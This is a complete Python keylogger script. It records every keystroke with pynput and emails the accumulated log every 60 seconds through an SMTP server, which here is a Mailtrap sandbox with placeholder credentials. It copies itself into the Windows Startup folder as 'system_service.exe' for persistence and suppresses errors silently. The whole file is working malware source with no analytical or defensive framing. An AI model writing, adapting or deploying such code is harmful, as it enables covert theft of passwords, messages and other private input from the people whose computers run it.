import smtplib
import threading
import os
import shutil
from pynput import keyboard

EMAIL_ADDRESS = "your_mailtrap_username"
EMAIL_PASSWORD = "your_mailtrap_password"
SEND_REPORT_EVERY = 60  # seconds

class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.email = email
        self.password = password
        self.log = ""

    def append_log(self, key_str):
        self.log += key_str

    def save_key(self, key):
        try:
            self.append_log(key.char)
        except AttributeError:
            if key == key.space:
                self.append_log(" ")
            elif key == key.enter:
                self.append_log("\n")
            else:
                self.append_log(f" [{key}] ")

    def send_mail(self, email, password, message):
        sender = "logger@example.com"
        receiver = "recipient@example.com"
        message_body = f"""\
Subject: Keylogger Report
To: {receiver}
From: {sender}

{message}
"""
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(sender, receiver, message_body)

    def report(self):
        if self.log:
            self.send_mail(self.email, self.password, self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def add_to_startup(self):
        if os.name == "nt":
            file_path = os.path.abspath(__file__)
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            target_path = os.path.join(startup_dir, "system_service.exe")
            if not os.path.exists(target_path):
                try:
                    shutil.copyfile(file_path, target_path)
                except Exception as e:
                    pass  # silently fail

    def run(self):
        self.add_to_startup()
        keyboard_listener = keyboard.Listener(on_press=self.save_key)
        self.report()
        keyboard_listener.start()
        keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
